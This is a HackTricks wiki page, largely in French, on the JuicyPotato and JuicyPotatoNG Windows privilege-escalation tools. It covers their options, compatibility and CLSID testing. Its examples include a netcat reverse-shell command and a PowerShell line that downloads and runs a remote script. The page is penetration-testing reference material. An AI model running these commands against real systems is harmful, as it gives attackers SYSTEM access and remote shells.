# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato est obsolète. Il fonctionne généralement sur les versions de Windows jusqu'à Windows 10 1803 / Windows Server 2016. Les changements opérés par Microsoft à partir de Windows 10 1809 / Server 2019 ont cassé la technique originale. Pour ces builds et versions plus récentes, envisagez des alternatives modernes telles que PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato et d'autres. Voir la page ci‑dessous pour des options et usages à jour.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abus des privilèges 'golden') <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Une version sucrée de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, avec un peu de jus, c.-à-d. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Notes rapides de compatibilité

- Fonctionne de manière fiable jusqu'à Windows 10 1803 et Windows Server 2016 lorsque le contexte courant possède `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.
- Cassée par le durcissement effectué par Microsoft dans Windows 10 1809 / Windows Server 2019 et versions ultérieures. Préférez les alternatives liées ci‑dessus pour ces builds.

### Résumé <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Voici Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

We discovered that, other than `BITS` there are a several COM servers we can abuse. They just need to:

1. être instanciables par l'utilisateur courant, normalement un “service user” qui dispose de privilèges d'impersonation
2. implémenter l'interface `IMarshal`
3. s'exécuter en tant qu'utilisateur élevé (SYSTEM, Administrator, …)

After some testing we obtained and tested an extensive list of [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) on several Windows versions.

### Détails juteux <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato vous permet de :

- **Target CLSID** _choisissez le CLSID que vous voulez._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _vous pouvez trouver la liste organisée par OS._
- **COM Listening port** _définissez le port d'écoute COM que vous préférez (au lieu du `6666` marshallé codé en dur)_
- **COM Listening IP address** _associer le serveur à n'importe quelle IP_
- **Process creation mode** _selon les privilèges de l'utilisateur impersonné, vous pouvez choisir parmi :_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _lancer un exécutable ou un script si l'exploitation réussit_
- **Process Argument** _personnaliser les arguments du processus lancé_
- **RPC Server address** _pour une approche discrète, vous pouvez vous authentifier auprès d'un serveur RPC externe_
- **RPC Server port** _utile si vous voulez vous authentifier vers un serveur externe et qu'un firewall bloque le port `135`…_
- **TEST mode** _principalement pour des tests, i.e. tester des CLSID. Il crée le DCOM et affiche l'utilisateur du token. Voir_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Utilisation <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Remarques finales <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

If the user has `SeImpersonate` or `SeAssignPrimaryToken` privileges then you are **SYSTEM**.

Il est presque impossible d'empêcher l'abus de tous ces COM Servers. Vous pourriez envisager de modifier les permissions de ces objets via `DCOMCNFG` mais bonne chance, ça va être difficile.

La vraie solution est de protéger les comptes sensibles et les applications qui s'exécutent sous les comptes `* SERVICE`. Bloquer `DCOM` inhiberait certainement cet exploit mais pourrait avoir un impact sérieux sur le système d'exploitation sous-jacent.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG réintroduit une élévation de privilèges locale JuicyPotato-style sur les versions modernes de Windows en combinant :
- résolution OXID DCOM vers un serveur RPC local sur un port choisi, évitant l'ancien listener codé en dur 127.0.0.1:6666.
- un hook SSPI pour capturer et usurper l'authentification entrante SYSTEM sans nécessiter RpcImpersonateClient, ce qui permet aussi CreateProcessAsUser lorsqu'uniquement SeAssignPrimaryTokenPrivilege est présent.
- des astuces pour satisfaire les contraintes d'activation DCOM (par ex., l'ancienne exigence du groupe INTERACTIVE lorsqu'on cible les classes PrintNotify / ActiveX Installer Service).

Notes importantes (comportement évolutif selon les builds) :
- September 2022: la technique initiale fonctionnait sur les cibles Windows 10/11 et Server prises en charge en utilisant le “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Utilisation de base (plus d'options dans l'aide) :
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Si vous ciblez Windows 10 1809 / Server 2019 où le JuicyPotato classique est patché, privilégiez les alternatives liées en haut (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG peut être situationnel selon la build et l'état du service.

## Exemples

Note: Visitez [this page](https://ohpe.it/juicy-potato/CLSID/) pour une liste de CLSIDs à essayer.

### Obtenir un nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Lancer un nouveau CMD (si vous avez accès RDP)

![](<../../images/image (300).png>)

## Problèmes de CLSID

Souvent, le CLSID par défaut que JuicyPotato utilise **ne fonctionne pas** et l'exploit échoue. Généralement, il faut plusieurs tentatives pour trouver un **CLSID fonctionnel**. Pour obtenir une liste de CLSID à essayer pour un système d'exploitation spécifique, vous devriez visiter cette page :

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Vérification des CLSID**

Tout d'abord, vous aurez besoin de quelques exécutables en plus de juicypotato.exe.

Téléchargez [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) et chargez-le dans votre session PS, puis téléchargez et exécutez [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ce script créera une liste de CLSID possibles à tester.

Ensuite, téléchargez [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (changez le chemin vers la liste de CLSID et vers l'exécutable juicypotato) et exécutez-le. Il commencera à essayer chaque CLSID, et **lorsque le numéro de port change, cela signifie que le CLSID a fonctionné**.

**Vérifiez** les CLSID fonctionnels **en utilisant le paramètre -c**

## Références

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
